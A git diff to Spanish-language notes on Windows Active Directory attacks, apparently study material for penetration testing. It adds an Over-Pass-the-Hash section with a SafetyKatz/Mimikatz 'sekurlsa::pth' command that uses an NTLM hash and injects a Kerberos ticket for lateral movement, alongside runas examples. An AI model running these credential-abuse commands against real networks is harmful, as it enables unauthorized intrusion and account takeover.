@@ -5,7 +5,8 @@
 - [Token](#Token).
 - [Movimiento_lateral](#Movimiento_lateral).
   - [runas](#runas).
-  - *[Pass-The-Hash](#Pass-The-Hash)*.
+  - *[Pass-the-Hash](#Pass-the-Hash)*.
+  - *[Over-Pass-the-Hash](#Over-Pass-the-Hash)*.
 
 # Enumeración
 ### Listar usuarios locales:
@@ -71,7 +72,7 @@ runas.exe /user:ffff /savecred cmd.exe
 runas /noprofile /netonly /user:domain\Administrator powershell.exe
 ```
 
-## *Pass-The-Hash*
+## *Pass-the-Hash*
 1. Se crea una nueva sesión.
 2. Se duplica el *token* original.
 3. Se referencia la nueva sesión.
@@ -86,10 +87,15 @@ Al contar con los paquetes de autenticación *msv1_0* y *kerberos*, es posible a
 msv1_0   - data copy @ 0000013DED28C5E0 : OK !
 kerberos - data copy @ 0000013DECC9C6C8
 ```
-## Over-Pass-The-Hash
+## *Over-Pass-the-Hash*
 1. Se crea una nueva sesión.
 2. Se actualizan *hash* y/o llaves de la sesión.
 3. Se copia el *token* original.
 4. Similar a **runas /netonly** pero sin credenciales.
 
-En caso de obtener un **TGT** para contar con su **TGS**, no se requiere ser Administrador, porque el paquete de autenticación de kerberos cuenta con mensajes que no requieren privilegios para su importación.
+En caso de obtener un **TGT** para contar con su **TGS**, no se requiere ser Administrador, porque el paquete de autenticación de Kerberos cuenta con mensajes que no requieren privilegios para su importación.
+```powershell
+C:\AD\Tools\SafetyKatz.exe "sekurlsa::pth /user:juan /domain:cs.org /ntlm:709d4242de780b1f34c19c78ad1630fd /ptt"
+```
+
+En este caso, se agrega el parámetro **/ptt** al comando de *Pass the Hash* anterior. Esto indica a Mimikatz que importe el ticket de Kerberos generado en la memoria del sistema para establecer una sesión de autenticación en lugar de solo realizar un *Pass the Hash*. Esto permite realizar la técnica de *Over Pass the Hash* y obtener acceso a otros recursos o sistemas dentro de la red.
